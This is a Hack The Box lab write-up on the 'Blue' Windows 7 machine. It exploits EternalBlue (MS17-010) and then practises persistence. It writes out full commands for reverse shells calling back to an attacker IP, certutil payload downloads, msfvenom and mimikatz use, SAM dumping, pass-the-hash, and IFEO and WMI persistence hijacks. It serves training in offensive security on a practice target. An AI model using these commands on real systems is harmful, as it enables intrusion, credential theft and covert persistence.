---
layout: post
title:  "Blue Writeup - Hack The Box"
date:   2025-03-05
desc: ""
keywords: "HTB,OSCP,Windows,EternalBlue,MS17-010,WindowsPersistence,Easy"
categories: [HTB]
tags: [HTB,OSCP,Windows,EternalBlue,MS17-010,WindowsPersistence,Easy]
icon: icon-htb
---

> **Disclaimer:** The ***writeups*** that I do on the different machines that I try to vulnerate, cover all the actions that I perform, even those that could be considered wrong, I consider that they are an essential part of the **learning curve** to become a **good professional**. So it can become very extensive content, if you are looking for something more direct, you should look for another site, there are many and of higher quality and different resolutions, moreover, I advocate that it is part of learning to consult different sources, to obtain greater expertise.

<br /><br />
<img src="{{ site.img_path }}/blue_writeup/Blue.png" width="100%" style="margin: 0 auto;display: block; max-width: 600px;">
<br /><br />

 **[Hack The Box](https://www.hackthebox.com){:target="_blank"}**'s **Blue** machine (Rated as **Easy**) has a vulnerability known worldwide for the impact it had on several organizations, **EternalBlue**, which I think is very nice to exploit to know the risks of not having a version update plan in action. The **Engagement** of the box is simple, but you can take advantage of this kind of lab to practice persistence or firewall bypass or other techniques. Well, it's time to spawn the box and start the **Engagement** methodology, which I'm refining as I face new **[Hack The Box](https://www.hackthebox.com){:target="_blank"}** labs.

<br /><br />
<img src="{{ site.img_path }}/blue_writeup/Blue_00.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

Once I have connectivity to the machine, I can start the **Reconnaissance** phase with trusted tools such as `nmap`. It is highly recommended to know and practice with each tool independently, to know its features and parameters that can be very useful in different scenarios. The first thing I look at is the version of the **Windows** Operating System configured on the target machine, the first thing that comes to a pentester's mind is the **EternalBlue** exploit. With tools like `rpcclient`, `smbclient` and `smbmap` I can enumerate the server, I find some shared resources through the **SMB** protocol and also the service is **Directory Path Traversal** susceptible.

```bash
ping -c 1 10.129.97.111
whichSystem.py 10.129.97.111
sudo nmap -sS --min-rate 5000 -p- --open -vvv -n -Pn 10.129.97.111 -oG allPorts
nmap -sCV -p135,139,445,49153,49154,49155,49156,49157 10.129.97.111 -oN targeted
cat targeted
#    --> Windows 7 Professional 7601 Service Pack 1

rpcclient -U "" 10.129.97.111
crackmapexec smb 10.129.97.111
smbclient -L 10.129.97.111 -N
smbmap -H 10.129.97.111 -u 'null'
smbclient //10.129.97.111/Users -c 'dir'
smbclient //10.129.97.111/Share -c 'dir'
smbclient //10.129.97.111/Share
  dir
  dir ../../../../                              # Directory Path Traversal
smbclient //10.129.97.111/Users
  dir
  dir ../../..                                  # :)
```

<br />
<img src="{{ site.img_path }}/blue_writeup/Blue_01.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/blue_writeup/Blue_02.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/blue_writeup/Blue_03.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/blue_writeup/Blue_04.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/blue_writeup/Blue_05.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

Since there are shared resources, but also many of them, the **Common Internet File System** (**CIFS**) can be used to create a mount on my attacking machine and browse faster and more efficiently. I can also check with `smbcacls` what kind of permissions exist for each folder, in case I want to download or upload files to the server.

> **Common Internet File System** (**CIFS**), an implementation of the **Server Message Block** (**SMB**) protocol, is used to share file systems, printers, or serial ports over a network. Notably, **CIFS** allows sharing files between **Linux** and **Windows** platforms regardless of version.

```bash
mkdir /mnt/SMBBlue
mount -t cifs //10.129.97.111/Users /mnt/SMBBlue -o username="null",password="null",domain="WORKGROUP",rw
pushd /mnt/SMBBlue
cd Default
smbcacls //10.129.97.111/Users Default/AppData -N
for file in $(ls); do echo $file; done | grep -v -i '^ntuser' | while read line; do echo -e "\n[*] $line:\n"; smbcacls //10.129.97.111/Users Default/$line -N | grep -i "everyone"; done
```

<br />
<img src="{{ site.img_path }}/blue_writeup/Blue_06.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/blue_writeup/Blue_07.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

To verify that the target machine is susceptible to the **[EternalBlue](https://www.hypr.com/security-encyclopedia/eternalblue){:target="_blank"}** exploit I can search for the `nmap` scripts in charge of leaking **SMB** protocol information, and once I execute the indicated command it informs me that it is vulnerable to **Remote Code Execution** (**ms17-010**). I always use some tools that are available on **Github** to exploit the vulnerability, the first one is from **[worawit](https://github.com/worawit/MS17-010){:target="_blank"}**. The first script I use is checker.py to find the Named pipes that allow me to perform the exploit, for some servers the script (username) must be modified to work correctly.

> **[EternalBlue](https://www.hypr.com/security-encyclopedia/eternalblue){:target="_blank"}** is a **Windows** exploit created by the **US National Security Agency** (**NSA**) and used in the **2017 WannaCry ransomware** attack. **EternalBlue** exploits a vulnerability in the **Microsoft** implementation of **the Server Message Block** (**SMB**) Protocol. This dupes a Windows machine that has not been patched against the vulnerability into allowing illegitimate data packets into the legitimate network. These data packets can contain malware such as a trojan, ransomware or similar dangerous program. 

> A **[pipe](https://learn.microsoft.com/en-us/windows/win32/ipc/pipes){:target="_blank"}** is a section of shared memory that processes use for communication. The process that creates a **pipe** is the pipe server. A process that connects to a pipe is a pipe client. One process writes information to the pipe, then the other process reads the information from the pipe.

> A **named pipe** is a **named**, **one-way** or **duplex pipe** for communication between the pipe server and one or more pipe clients. All instances of a named pipe share the same pipe name, but each instance has its own buffers and handles, and provides a separate conduit for client/server communication.

```bash
locate *.nse | grep 'smb-'
nmap --script smb-vuln\* -p445 10.129.97.111
#    --> Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
#    --> State: VULNERABLE
#    --> IDs:  CVE:CVE-2017-0143

git clone https://github.com/worawit/MS17-010
python3 checker.py 10.129.97.111                      # :(
python2 checker.py 10.129.97.111                      # Not found pipe
# all STATUS_ACCESS_DENIED!!!

ncat checker.py
nvim checker.py
ncat checker.py | grep guest
python2 checker.py 10.129.97.111                      # :)

# Read BUG.txt!!
```

<br />
<img src="{{ site.img_path }}/blue_writeup/Blue_08.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/blue_writeup/Blue_09.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/blue_writeup/Blue_10.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/blue_writeup/Blue_11.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/blue_writeup/Blue_12.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

Another tool I use to exploit the **EternalBlue** is from **[3ndG4me](https://github.com/3ndG4me/AutoBlue-MS17-010){:target="_blank"}**, unfortunately with the `eternal_checker.py` script I can't find any **Named piped** (but with the **[worawit](https://github.com/worawit/MS17-010){:target="_blank"}** script I have already identified them). This tool has the `shell_prep.sh` script to compile the **Shellcode** that allows to exploit the machine, for both Windows OS architectures. Then with the malicious script `eternalblue_exploit7.py` I try with different **shellcodes** and the one that allows me to obtain a **Reverse Shell** is the **64 bit** one. There is also another exploit, the `zzz_exploit.py` that performs the whole task, without the shellcode, you only need to customize it to include the command to inject, but on this machine I did not succeed, so I will access with the shellcode to start the enumeration of the system.

> **Attacker Machine**:

```bash
git clone https://github.com/3ndG4me/AutoBlue-MS17-010
python2 eternal_checker.py 10.129.97.111
./shell_prep.sh
# y  10.10.14.84 443 444 1 1

sudo rlwrap -cAr nc -nlvp 443
python2 eternalblue_exploit7.py 10.129.97.111
python2 eternalblue_exploit7.py 10.129.97.111 ./shellcode/sc_all.bin        # :(
python2 eternalblue_exploit7.py 10.129.97.111 ./shellcode/sc_x64.bin        # :)
```

> **Victime Machine**:

```cmd
whoami
hostname
ipconfig
```

> **Attacker Machine**:

```bash
nvim zzz_exploit.py
locate nc.exe /usr
cp /usr/share/SecLists/Web-Shells/FuzzDB/nc.exe .
sudo impacket-smbserver smbFolder $(pwd) -smb2support
sudo rlwrap -cAr nc -nlvp 443
python2 zzz_exploit.py 10.129.97.111 browser
# :(
```

<br />
<img src="{{ site.img_path }}/blue_writeup/Blue_13.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/blue_writeup/Blue_14.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/blue_writeup/Blue_15.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/blue_writeup/Blue_16.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/blue_writeup/Blue_17.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/blue_writeup/Blue_18.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

Continuing to enumerate the system is no longer necessary, as the vulnerability exploit allows me to access with full privileges and I can view the contents of any file, including the two flags to validate against **[Hack The Box](https://www.hackthebox.com){:target="_blank"}** the compromise of the box. To make the most of the lab, I am going to practice some **Persistence** techniques, the first is to set up an account on the target machine and then validate with `crackmapexec`. Once the account is validated, I need to modify some values in the **Windows Registry** so that I can add the new account to the **Administrators group**. Once this is done, I can verify again with `crackmapexec` that I have successfully **`pwned`** the box, and then with the same tool I can use different modules to view the contents of the **SAM** database. With the password hash of the **Administrator** user I can get a shell with the `pth-winexe` tool from **[pth-toolkit](https://blog.ropnop.com/practical-usage-of-ntlm-hashes/){:target="_blank"}**.

> **Victime Machine**:

```cmd
# 1st Persistence Method
net user oldb0y oldb0y123!$ /add
net localgroup Administrators oldb0y /add
```

> **Attacker Machine**:

```bash
crackmapexec smb 10.129.97.111 -u 'oldb0y' -p 'oldb0y123!$'
# Validated but not pwn3d!
```

> **Victime Machine**:

```cmd
cmd /c reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
```

> **Attacker Machine**:

```bash
crackmapexec smb 10.129.97.111 -u 'oldb0y' -p 'oldb0y123!$'
# [+] haris-PC\oldb0y:oldb0y123!$ (Pwn3d!)

crackmapexec smb 10.129.97.111 -u 'oldb0y' -p 'oldb0y123!$' -x 'whoami'
crackmapexec smb 10.129.97.111 -u 'oldb0y' -p 'oldb0y123!$' --module Mimikatz -o COMMAND='sekurlsa::logonPassword'
crackmapexec smb 10.129.97.111 -u 'oldb0y' -p 'oldb0y123!$' -M mimikatz -o COMMAND='sekurlsa::logonPassword'
crackmapexec smb 10.129.97.111 -u 'oldb0y' -p 'oldb0y123!$' --sam
crackmapexec smb 10.129.97.111 -u 'Administrator' -H 'cdf51b162460b7d5bc898f493751a0cc'

pth-winexe --help
# pth-winexe. The pth suite uses the format DOMAIN/user%hash

pth-winexe -U WORKGROUP/Administrator%aad3b435b51404eeaad3b435b51404ee:cdf51b162460b7d5bc898f493751a0cc //10.129.97.111 cmd.exe
rlwrap -cAr pth-winexe -U WORKGROUP/Administrator%aad3b435b51404eeaad3b435b51404ee:cdf51b162460b7d5bc898f493751a0cc //10.129.97.111 cmd.exe
```

<br />
<img src="{{ site.img_path }}/blue_writeup/Blue_19.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/blue_writeup/Blue_20.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/blue_writeup/Blue_21.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/blue_writeup/Blue_22.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/blue_writeup/Blue_23.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/blue_writeup/Blue_24.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

Another way to **[obtain the hash](https://www.picussecurity.com/hubfs/Threat%20Readiness%20-%20Active%20Directory%20Ebook%20-%20Q123/Picus-The-Complete-Active-Directory-Security-Handbook.pdf){:target="_blank"}** of the user with maximum privileges is to make a copy of the **SAM** and **SYSTEM** hives of the victim machine, then I transfer them to my attacker machine to use different tools like `pwdump.py`, `samdump2` or `secretsdump` to obtain the hashes of all users. Then with `psexec` I can connect to the victim machine with the user **Administrator** exploiting the **Pass The Hash** attack.

> **Victime Machine**:

```cmd
# 2nd Persistence Method
reg save HKLM\sam sam.backup
reg save HKLM\system system.backup
```

> **Attacker Machine**:

```bash
sudo impacket-smbserver smbFolder $(pwd) -smb2support
```

> **Victime Machine**:

```cmd
copy .\sam.backup \\10.10.14.84\smbFolder\sam
copy .\sam.backup \\10.10.14.84\smbFolder\system
certutil.exe -hashfile .\system.backup MD5          # :)
certutil.exe -hashfile .\sam.backup MD5             # :)
```

> **Attacker Machine**:

```bash
md5sum system
md5sum sam

/usr/share/creddump7/pwdump.py system sam                   # :)
samdump2 system sam                                         # :)
impacket-secretsdump -sam sam -system system LOCAL          # :)
crackmapexec smb 10.129.97.111 -u 'Administrator' -H 'cdf51b162460b7d5bc898f493751a0cc' --lsa
impacket-psexec WORKGROUP/Administrator@10.129.97.111 -hashes :cdf51b162460b7d5bc898f493751a0cc
```

<br />
<img src="{{ site.img_path }}/blue_writeup/Blue_25.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/blue_writeup/Blue_26.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/blue_writeup/Blue_27.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/blue_writeup/Blue_28.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

Another way to create **Persistence** and also bypass the **Firewall** is to use the **[Ebowla](https://github.com/Genetic-Malware/Ebowla){:target="_blank"}** project to create **Genetic Malware**, in this case I will configure a specific `mimikatz` for the **Blue** machine. I download the project and customize the `genetic.config` configuration file, the principal thing I have to take into account is to set correctly the values of the **Environment variables** of the target machine. Once the changes are done I use the `build_x64_go.sh` script (the victim machine has a 64bit architecture) and create a `mimikatz` that could bypass the firewall. 

> **Attacker Machine**:

```bash
# 3th Persistence Method & Firewall Evasion
locate mimikatz.exe
cp /usr/share/windows-resources/mimikatz/x64/mimikatz.exe .
git clone https://github.com/Genetic-Malware/Ebowla
mv /home/al3j0/Downloads/Ebowla-master.zip .
7z l Ebowla-master.zip
unzip Ebowla-master.zip -d Ebowla
ncat genetic.config
nvim !$
cat genetic.config | grep -E 'output_type|payload_type'
nvim !$
```

> **Victime Machine**:

```cmd
echo %username%
echo %computername%
echo %homepath%
echo %homedrive%
echo %Number_of_processors%
echo %processor_identifier%
echo %processor_revision%
echo %userdomain%
echo %systemdrive%
echo %userprofile%
echo %path%
echo %temp%
```

<br />
<img src="{{ site.img_path }}/blue_writeup/Blue_29.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/blue_writeup/Blue_30.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/blue_writeup/Blue_31.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/blue_writeup/Blue_32.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/blue_writeup/Blue_33.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/blue_writeup/Blue_34.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

Now that I have the **[Ebowla](https://github.com/Genetic-Malware/Ebowla){:target="_blank"}** configuration file customized, I'm going to look for the `mimikatz.exe` on my machine so I can encode it with the `ebowla.py` script, which I later notice works with `python2`. Once I get the encoded payload I use the script `build_x64_go.sh` to build the new `mimikatz.exe` capable of bypassing the firewall. Now I just have to transfer it to the victim machine and run it, but I do not succeed, maybe I did not set the values of the environment variables correctly, so I remove some that may not be necessary and repeat the whole process again, but again I have the same problem, so I'm going to look for another way to establish persistence.

> **Attacker Machine**:

```bash
# 4th Persistence Method
python3 ebowla.py
python2 ebowla.py
pip2 install configobj
python2 ebowla.py
ls -l ./output
./build_x64_go.sh -h
./build_x64_go.sh ./output/go_symmetric_mimikatz.exe.go malicious_mimikatz.exe
python3 -m http.server 80
```

> **Victime Machine**:

```cmd
certutil.exe -f -urlcache -split http://10.10.14.84/malicious_mimikatz.exe
.\malicious_mimikatz.exe                  # :(
```

> **Attacker Machine**:

```bash
python2 ebowla.py mimikatz.exe genetic.config
./build_x64_go.sh ./output/go_symmetric_mimikatz.exe.go malicious_mimikatz.exe
python3 -m http.server 80
```

> **Victime Machine**:

```cmd
certutil.exe -f -urlcache -split http://10.10.14.84/malicious_mimikatz.exe
certutil.exe -hashfile '.\malicious_mimikatz.exe' MD5
```

> **Attacker Machine**:

```bash
md5sum malicious_mimikatz.exe
```

> **Victime Machine**:

```cmd
malicious_mimikatz.exe                    # :(
```

<br />
<img src="{{ site.img_path }}/blue_writeup/Blue_35.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/blue_writeup/Blue_36.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/blue_writeup/Blue_37.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/blue_writeup/Blue_38.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/blue_writeup/Blue_39.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/blue_writeup/Blue_40.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/blue_writeup/Blue_41.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

If I transfer the original unmodified `mimikatz.exe` binary to the victim machine and run it, I have no problems. I can leak sensitive information from the **administrator** account, so the problem with the custom `mimikatz.exe` is that I did not generate it correctly. But another way to achieve persistence is to enable the **Remote Desktop Protocol** (**RDP**) with the `crackmapexec` **rdp** module, with `netstat` I check that it was not enabled, but then with the credentials that I have of the administrator user I can enable it successfully. Now with `rdesktop` I can connect with the password of the **administrator** user that I leaked with `mimikatz.exe`.

> **Victime Machine**:

```cmd
certutil.exe -f -urlcache -split http://10.10.14.84/mimikatz.exe
mimikatz.exe                              # :)
  token::elevate
  sekurlsa::logonPasswords

netstat -ano
# Port 3389 RDP disable
```

> **Attacker Machine**:

```bash
# 5th Persistence Method
crackmapexec smb 10.129.97.111 -u 'Administrator' -H 'cdf51b162460b7d5bc898f493751a0cc'
crackmapexec smb 10.129.97.111 -u 'Administrator' -H 'cdf51b162460b7d5bc898f493751a0cc' -M rdp -o action=enable
```

> **Victime Machine**:

```cmd
netstat -ano
# Port 3389 RDP disable :(
```

> **Attacker Machine**:

```bash
crackmapexec smb 10.129.97.111 -u 'Administrator' -p 'ejfnIWWDojfWEKM'
crackmapexec smb 10.129.97.111 -u 'Administrator' -p 'ejfnIWWDojfWEKM' -M rdp -o action=enable
```

> **Victime Machine**:

```cmd
netstat -ano
# 0.0.0.0:3389        :)
```

> **Attacker Machine**:

```bash
rdesktop 10.129.97.111 -u 'Administrator' -p 'ejfnIWWDojfWEKM' -d WORKGROUP
#  yes
```

<br />
<img src="{{ site.img_path }}/blue_writeup/Blue_42.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/blue_writeup/Blue_43.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/blue_writeup/Blue_44.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/blue_writeup/Blue_45.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/blue_writeup/Blue_46.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/blue_writeup/Blue_47.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

I continue my practice of setting up **persistence** on Windows machines, now I am going to try to modify the **Windows registry** to use the **[Image File Execution Options (IFEO)](https://securityblueteam.medium.com/utilizing-image-file-execution-options-ifeo-for-stealthy-persistence-331bc972554e){:target="_blank"}** feature for developers and when I run a legitimate **Windows binary** it will execute a command that I set up to get a **Reverse Shell** with `nc.exe`. First I am going to create a copy of the Windows calculator `calc.exe`, since it is the binary I am going to use, then I transfer `nc.exe` to the target machine and I only have to modify the Windows registry. To test that everything works correctly, I open with `nc` the port **443** to wait for the remote connection and I connect by **RDP** with `rdesktop`, then I can open the calculator and I can have access to the box again. I can also choose another binary that some user uses regularly, like `notepad.exe`, and perform a similar procedure to the one already done.


> **Victime Machine**:

```cmd
# 6th Persistence Method
cd C:\Windows\System32
copy calc.exe _calc.exe
dir *calc*
cd C:\Windows\Temp\privesc
```

> **Attacke Machine**:

```bash
python3 -m http.server 80
```

> **Victime Machine**:

```cmd
certutil.exe -f -urlcache -split http://10.10.14.84/nc.exe
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\calc.exe" /v Debugger /t reg_sz /d "cmd /C _calc.exe & c:\windows\temp\privesc\nc.exe -e cmd 10.10.14.84 443" /f
```

> **Attacker Machine**:

```bash
rdesktop 10.129.97.111 -u 'Administrator' -p 'ejfnIWWDojfWEKM' -d WORKGROUP
sudo rlwrap -cAr nc -nlvp 443
```

> **Victime Machine**:

```cmd
# Choosing another binary
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v GlobalFlag /t REG_DWORD /d 512
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v ReportingMode /t REG_DWORD /d 1
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v MonitorProcess /d "c:\windows\temp\privesc\nc.exe -e C:\windows\system32\cmd.exe 10.10.14.84 443"
```

> **Attacker Machine**:

```bash
rdesktop 10.129.97.111 -u 'Administrator' -p 'ejfnIWWDojfWEKM' -d WORKGROUP
sudo rlwrap -cAr nc -nlvp 443
```

<br />
<img src="{{ site.img_path }}/blue_writeup/Blue_48.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/blue_writeup/Blue_49.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/blue_writeup/Blue_50.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/blue_writeup/Blue_51.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/blue_writeup/Blue_52.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/blue_writeup/Blue_53.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/blue_writeup/Blue_54.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/blue_writeup/Blue_55.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

I know there are many ways to maintain persistence, but I am going to perform one last method and then in other **[Hack The Box](https://www.hackthebox.com){:target="_blank"}** boxes look for new ways. Now I can use **Windows Management Instrumentation** (**WMI**) to execute malicious code when a defined event occurs, so with the help of `msfvenom` I generate a malicious **.exe binary** that is in charge of sending me a **Reverse Shell** and with `wmic` I subscribe an event so that when this event occurs the code is executed. I only have to wait a while and again I get the remote connection with `nc`.

> **Attacker Machine**:

```bash
# 7th Persistence Method
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.84 LPORT=443 -f exe -o malicious.exe
python3 -m http.server 80
```

> **Victime Machine**:

```cmd
certutil.exe -f -urlcache -split http://10.10.14.84/malicious.exe
wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter CREATE Name="persistence", EventNameSpace="root\cimv2",QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer CREATE Name="persistence", ExecutablePath="C:\windows\temp\privesc\malicious.exe",CommandLineTemplate="C:\windows\temp\privesc\malicious.exe"
wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name="persistence"", Consumer="CommandLineEventConsumer.Name="persistence""
```

> **Attacker Machine**:

```bash
sudo rlwrap -cAr nc -nlvp 443
```

<br />
<img src="{{ site.img_path }}/blue_writeup/Blue_56.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/blue_writeup/Blue_57.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

> It was an easy machine to engage, because the vulnerability is well known, but perhaps for someone just starting out in the **Information Security** field it can be a nice opportunity to learn how dangerous it can be to have an **out-of-date** Operating System. I was also able to practice various methods to **gain persistence** on Windows machines, which in a real environment audit is a great help to perform **Pivoting**. The **[Hack The Box](https://www.hackthebox.com){:target="_blank"}** platform always helps me in my professional growth and to improve my skills, it's time to rest for a second and continue with the practice, so it only remains to kill the box and choose the next one.

<br /><br />
<img src="{{ site.img_path }}/blue_writeup/Blue_58.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
